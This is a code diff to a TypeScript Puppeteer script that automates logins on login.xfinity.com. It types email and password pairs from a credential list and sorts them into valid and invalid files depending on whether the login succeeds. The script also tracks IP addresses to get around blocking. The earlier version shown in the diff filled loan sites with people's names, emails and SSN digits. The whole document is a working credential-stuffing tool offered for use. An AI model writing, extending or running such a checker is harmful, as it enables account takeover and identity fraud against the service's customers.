@@ -39,29 +39,21 @@ interface PageConfiguration {
 }
 
 interface ConfigurationPerPage {
-  americanWebLoan: PageConfiguration;
-  withULoans: PageConfiguration;
+  xfinity: PageConfiguration;
 }
 
 const CONFIGURATION_PER_PAGE: ConfigurationPerPage = {
-  americanWebLoan: {
-    pageUrl: 'https://www.americanwebloan.com/',
+  xfinity: {
+    pageUrl: 'https://login.xfinity.com/login',
     loanAmountSelector: '#amount',
     formSelector: '#homepage-form',
-  },
-  withULoans: {
-    pageUrl: 'https://www.withuloans.com/',
-    loanAmountSelector: '#amount',
-    formSelector: '#get-started-form',
   },
 };
 
 const SELECTORS = {
-  firstNameInput: '#firstName',
-  lastNameInput: '#lastName',
-  emailInput: '#email',
-  ssnInput: '#ssn',
-  applyNowButton: 'input[type=submit]',
+  emailInput: '#user',
+  password: '#passwd',
+  submitButton: '#sign_in',
 };
 
 const getIP = async () => {
@@ -69,6 +61,7 @@ const getIP = async () => {
     const { data: ip } = await axios.get<string>('https://api.ipify.org');
     return ip;
   } catch (error) {
+    logger.error(error);
     // defualt ip when request fails
     return '127.0.0.1';
   }
@@ -101,7 +94,7 @@ const validateIp = async (
 
   const ipsData = fileData ? fileData.split(/\n/).filter(Boolean) : [];
 
-  const isIPUsed = ipsData.includes(ip);
+  const isIPUsed = [...ipsData, '127.0.0.1'].includes(ip);
 
   if (!isIPUsed) {
     logger.warn(`New IP: ${ip}`);
@@ -159,13 +152,15 @@ export const getCredentialInformationScrapper = async (
       isInvalidIp = await validateIp(ip, pageConfigKey);
 
       if (isInvalidIp) {
+        console.log(`CURRENT IP: ${ip}`);
+
         await page.close();
 
         page = await _browser.newPage();
 
         await page.setViewport({
-          width: 1920,
-          height: 1080,
+          width: 1920 / 1.5,
+          height: 1080 / 1.5,
         });
 
         await page.goto(pageUrl, {
@@ -176,7 +171,7 @@ export const getCredentialInformationScrapper = async (
       await new Promise((r) => setTimeout(r, 3000));
     }
 
-    console.log('out of loop');
+    // console.log('out of loop');
 
     const screenshotRedirectDirectory = path.join(
       `${__dirname}/data/screenshots-redirect/${validFileName}`,
@@ -194,16 +189,16 @@ export const getCredentialInformationScrapper = async (
 
     // TODO: Add logic to select a loan amount
 
-    await page.type(SELECTORS.lastNameInput, credential.lastname);
+    // await page.type(SELECTORS.lastNameInput, credential.lastname);
 
-    await page.type(SELECTORS.firstNameInput, credential.name);
+    // await page.type(SELECTORS.firstNameInput, credential.name);
 
     await page.type(SELECTORS.emailInput, credential.email);
 
-    await page.type(SELECTORS.ssnInput, credential.last4ssn);
+    // await page.type(SELECTORS.ssnInput, credential.last4ssn);
 
     await Promise.all([
-      await page.click(SELECTORS.applyNowButton),
+      await page.click(SELECTORS.submitButton),
       await page.waitForNavigation({
         timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
         waitUntil: 'networkidle0',
@@ -212,11 +207,41 @@ export const getCredentialInformationScrapper = async (
 
     await new Promise((r) => setTimeout(r, 1000));
 
-    const outputMessage = generateOutputMessage(credential, page.url(), ip);
+    const passwordInput = await page.$(SELECTORS.password);
 
-    logger.info(outputMessage);
+    // true if email is valid and password input exist else invalid
+    if (passwordInput) {
+      await page.type(SELECTORS.password, credential.password);
 
-    validWriteLineOnFile(outputMessage);
+      await Promise.all([
+        await page.click(SELECTORS.submitButton),
+        await page.waitForNavigation({
+          timeout: TIMEOUT_WAIT_FOR_NAVIGATION_MILLISECONDS,
+          waitUntil: 'networkidle0',
+        }),
+      ]);
+
+      // true if password is valid else invalid
+      if (page.url().includes('auth')) {
+        const outputMessage = generateOutputMessage(credential, page.url(), ip);
+
+        logger.info(outputMessage);
+
+        validWriteLineOnFile(outputMessage);
+      } else {
+        const outputMessage = generateOutputMessage(credential, page.url(), ip);
+
+        logger.error(outputMessage);
+
+        invalidWriteLineOnFile(outputMessage);
+      }
+    } else {
+      const outputMessage = generateOutputMessage(credential, page.url(), ip);
+
+      logger.error(outputMessage);
+
+      invalidWriteLineOnFile(outputMessage);
+    }
 
     if (SCREENSHOT_DISABLED) {
       await page.screenshot({
